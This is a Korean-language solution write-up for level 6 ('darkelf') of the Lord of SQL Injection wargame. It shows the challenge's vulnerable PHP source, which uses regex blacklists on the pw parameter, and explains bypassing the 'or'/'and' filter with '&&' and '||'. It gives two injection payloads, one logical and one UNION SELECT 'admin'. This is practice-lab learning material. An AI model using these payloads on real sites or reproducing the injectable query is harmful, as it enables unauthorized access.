# Lord of SQL Injection No.6 - Darkelp
## 문제 출제 의도
1. 'and', 'or' 없이 SQL문을 조작 할 수 있는지 확인.
## 소스 코드
~~~
<?php 
    include "./config.php"; 
    login_chk(); 
    dbconnect();  
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
    if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
    $query = "select id from prob_darkelf where id='guest' and pw='{$_GET[pw]}'"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysql_fetch_array(mysql_query($query)); 
    if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
    if($result['id'] == 'admin') solve("darkelf"); 
    highlight_file(__FILE__); 
?>
~~~
## 분석 결론
+ 금지 문자, 문자열
    - GET방식으로 입력받은 pw값에 prob _ . () 중 하나라도 있다면 "No Hack ~_~"이 출력되고 문제 풀이에 실패한다.
    - GET방식으로 받은 pw값에 "or", "and"중 하나라도 있다면 "HeHe"가 출력되고 문제풀이에 실패한다.
## 문제 해결
1. Query문 추가
    - And와 OR 우회
        1. AND는 기본적으로 &&로 우회가 가능하다.  
        그러나 이때 &는 파라미터 값으로 인식됨으로 %26으로 입력해야한다.
        2. OR는 기본적으로 ||로 우회가 가능하다.
    - 다음과 유사한 방법으로 WHERE조건절을 조작 할 수 있다.
    ~~~
    ?pw='%26%260||id='admin'-- -
    ~~~
2. UNION
    - 다음과 유사한 방법으로 빈 테이블에 추가 값을 가지고 올 수 있다.
    ~~~
    ?pw=' UNION(SELECT 'admin')-- -
    ~~~